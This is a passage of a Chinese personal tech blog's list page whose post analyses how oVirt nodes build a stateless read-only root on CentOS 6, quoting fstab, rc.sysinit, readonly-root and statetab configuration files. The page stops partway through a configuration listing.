<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.1.0">
<title data-rh="true">Blog | 老司机的文档集</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://itxx00.github.io/notes/blog/page/4"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" property="og:title" content="Blog | 老司机的文档集"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/notes/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://itxx00.github.io/notes/blog/page/4"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://itxx00.github.io/notes/blog/page/4" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/notes/blog/rss.xml" title="老司机的文档集 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/notes/blog/atom.xml" title="老司机的文档集 Atom Feed"><link rel="stylesheet" href="/notes/assets/css/styles.84b04062.css">
<link rel="preload" href="/notes/assets/js/runtime~main.ae88a0f6.js" as="script">
<link rel="preload" href="/notes/assets/js/main.2eb4d627.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="跳到主要内容"><a href="#" class="skipToContent_fXgn">跳到主要内容</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/notes/"><div class="navbar__logo"><img src="https://github.com/itxx00.png" alt="老司机" class="themedImage_ToTc themedImage--light_HNdA"><img src="https://github.com/itxx00.png" alt="老司机" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">老司机</b></a><a class="navbar__item navbar__link" href="/notes/docs/intro">Tutorial</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/notes/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/itxx00/notes" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/04/20/pre-commit-basic">pre-commit basic usage</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2022/04/20/pxe-cobbler-install">使用cobbler批量安装centos系统</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2021/12/16/cvm-kylin-v10-iso-install">CVM使用ISO镜像安装银河麒麟v10 arm系统</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm">银河麒麟v10 aarch64机器构建percona-xtrabackup-80 rpm包</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/notes/blog/2021/07/21/uos-arm64-build-percona-xtrabackup-80">UOS arm64机器build percona-xtrabackup-80 deb包</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/03/14/ovirt-stateless">Ovirt中的stateless实现机制分析</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-14T00:00:00.000Z" itemprop="datePublished">2013年3月14日</time> · <!-- -->阅读需 10 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>我发现ovirt的node也就是运行虚拟机的主机被设计成了这样：整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，明白了为什么需要这种stateless也就是无状态的设计</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ovirt简介">Ovirt简介<a class="hash-link" href="#ovirt简介" title="标题的直接链接">​</a></h2><p>这是来自centos wiki中的描述：</p><blockquote><p>oVirt 是个管理虚拟化的应用程序。言下之意就是你可利用 oVirt 的管理界面（oVirt 引擎）来管理硬件节点、存储及网络资源，并部署及监控在你的数据中心内运行的虚拟机器。
如果你熟识 VMware 的产器，oVirt 在理念上与 vSphere 类同。Red Hat 企业级虚拟化产品以 oVirt 作为基础，这个上游计划内开发的新功能，日后亦会在获支持的产品内出现。</p></blockquote><p>ovirt是一套虚拟化管理的系统，其对标产品是vmware的vsphere，它分为ovirt-engine和ovirt-node，可以用ovirt的这套系统来管理虚拟机群，现在虚拟化相关产品众多，微软，vmware，oracle等都在做这方面的产品，于是IBM红帽ubuntu等厂商就联合起来开始搞这个东西了，红帽很早就开始投入kvm了，红帽做的是RHEV的整套系统，也分为node和engine只是名字不一样，后来干脆就把node的RHEV-H给贡献出来，大家一起搞ovirt了。前几天我也试用了一下ovirt和RHEV，发现他们的node也就是运行虚拟机的主机被设计成了这样: 整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，才知道这叫stateless，无状态，这么做的好处是运行环境和存储分离，提高整体可用性。在分析了ovirt中的stateless实现机制之后，下面将在centos6上尝试手工配置，过程中请教了几位ovirt的开发,再次表示感谢</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于stateless">关于stateless<a class="hash-link" href="#关于stateless" title="标题的直接链接">​</a></h2><p>这种stateless的设计来自很早之前红帽在fedora里面做的尝试，目的是把系统做成liveCD，下面是一些关于stateless的描述：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">read-only root file system(stateless linux)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Readonly root support.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This was add to Fedora for Stateless Linux, i.e. for creating live Fedora CDs.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How to use:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Edit `/etc/sysconfig/readonly-root`. Set &#x27;READONLY&#x27; to &#x27;yes&#x27;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Add any exceptions that need to be writable that aren&#x27;t in the stock `/etc/rwtab` to an /etc/rwtab.d file. (See below)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How it works:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * On boot, we mount a tmpfs (by default, at /var/lib/stateless/writable), and then parse `/etc/rwtab` and `/etc/rwtab.d/*` for things to put there.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">These files have the format:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`&lt;type&gt;  &lt;path&gt;`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Types are as follows:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * empty: An empty path. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `empty     /tmp`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * dirs: A directory tree that is copied, empty. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `dirs      /var/run`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * files: A file or directory tree that is copied intact. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `files     /etc/resolv.conf`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">A stock rwtab is shipped with common things that need mounted.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">When your computer comes back up, the root and any other system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">partitions will be mounted read-only. All the files and directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listed in `/etc/rwtab` will be mounted read-write on a tmpfs filesystem.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can add additional files and directories to rwtab to make them</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable after reboot.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that this system is stateless. When you reboot again, everything</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">written to the tmpfs filesystem vanishes and the system will be exactly</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">as it was the last time it was booted. You could add a writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filesystem on disk or NFS for writing files you want to retain after</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rebooting.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Take a look at `/etc/rc.d/rc.sysinit` to see how the magic is done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This capability is a &quot;technology preview&quot; (beta) and is buggy. Note that</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`/etc/mtab` and thus &quot;mount&quot; do not show the complete list of filesystems</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">because the /etc directory is on a read-only filesystem. /proc/mounts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">always shows the correct mount information. You could update `/etc/mtab`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from /proc/mounts to correct it both after boot and after running the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mount or umount commands to change mounts.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Run `fgrep -v rootfs /proc/mounts &gt;/etc/mtab` to correct `/etc/mtab`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that mounting or symlinking /proc/mounts to /etc/mtab causes other</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">problems such as breaking the df command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can change your read-only root filesystem to read-write mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">immediately with this command run by the root user:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`mount -n -o remount,rw /`</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="分析其实现机制">分析其实现机制<a class="hash-link" href="#分析其实现机制" title="标题的直接链接">​</a></h2><p>下面把分析过程记录下来：</p><p>首先我看到的是fstab文件</p><p>/etc/fstab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/dev/root / ext2 defaults,ro,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">devpts /dev/pts devpts gid=5,mode=620 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tmpfs /dev/shm tmpfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc /proc proc defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sysfs /sys sysfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Config /config ext4 defaults,noauto,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">debugfs /sys/kernel/debug debugfs 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Swap swap swap defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Logging /var/log ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Data /data ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/images /var/lib/libvirt/images bind bind 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/core /var/log/core bind bind 0 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里要注意的地方就是root后面的ro，也就是说被挂载成了只读，这说明stateless是在挂载磁盘之前就已经完成，那肯定跟系统启动相关，
接着我们找到rc.sysinit这个在系统启动阶段执行的脚本中下面这段内容:</p><p>/etc/rc.d/rc.sysinit</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">file</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> /etc/statetab /etc/statetab.d/* </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    is_ignored_file </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> -f </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> -f </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$STATE_MOUNT</span><span class="token string" style="color:#e3116c">/</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> -n --bind </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$STATE_MOUNT</span><span class="token string" style="color:#e3116c">/</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">path</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable function" style="color:#d73a49">grep</span><span class="token variable" style="color:#36acaa"> -v </span><span class="token variable string" style="color:#e3116c">&quot;^#&quot;</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">&quot;</span><span class="token variable string variable" style="color:#36acaa">$file</span><span class="token variable string" style="color:#e3116c">&quot;</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator file-descriptor important" style="color:#393A34">2</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">/dev/null</span><span class="token variable" style="color:#36acaa">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mount_state </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> -n </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$SELINUX_STATE</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> -a -e </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> restorecon -R </span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这段shell里面牵扯到了个/etc/statetab,而且通过对比普通系统还发现其他地方的不同</p><p>diff rc.sysinit /etc/rc.sysinit</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">102a103,108</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; elif [[ &quot;$system_release&quot; =~ &quot;CentOS&quot; ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;36m&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo -en &quot;CentOS&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;39m&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; PRODUCT=$(sed &quot;s/CentOS \(.*\) \?release.*/\1/&quot; /etc/system-release)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo &quot; $PRODUCT&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">499c505</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">501c507</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着看看这个/etc/statetab文件是个什么样子的：</p><p>/etc/statetab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># A list of paths which should be bind-mounted from a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># partition dedicated to persistent data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># See $STATE_LABEL in /etc/sysconfig/readonly-root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Examples:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /etc/ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /var/spool/mail</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>顺藤摸瓜我们发现和/etc/sysconfig/readonly-root这个文件有关，从文件名上即可得知和只读的关联：</p><p>/etc/sysconfig/readonly-root</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set to </span><span class="token string" style="color:#e3116c">&#x27;yes&#x27;</span><span class="token plain"> to </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> the system filesystems read-only.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">READONLY</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token 